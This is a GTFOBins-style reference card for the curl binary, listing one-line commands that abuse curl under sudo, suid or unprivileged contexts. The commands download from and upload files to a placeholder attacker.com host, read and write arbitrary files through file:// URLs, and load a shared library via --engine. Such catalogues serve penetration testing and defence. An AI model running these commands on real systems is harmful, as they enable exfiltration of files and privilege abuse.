---
type: gtfobin
name: curl
platform: Unix
functions: [download, file-read, file-write, library-load, upload]
tags: [gtfobin, unix, lotl]
---

# curl

## download

```bash
curl http://attacker.com/path/to/input-file -o /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
curl file:///path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## library-load

```bash
curl --engine /path/to/lib.so x
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
curl -X POST --data-binary @/path/to/input-file http://attacker.com
```
**Contexts:** sudo, suid, unprivileged

```bash
curl -X POST --data-binary DATA http://attacker.com
```
**Contexts:** sudo, suid, unprivileged

```bash
curl gopher://attacker.com:12345/_DATA
```
_Data will be `\r\n` terminated._
**Contexts:** sudo, suid, unprivileged
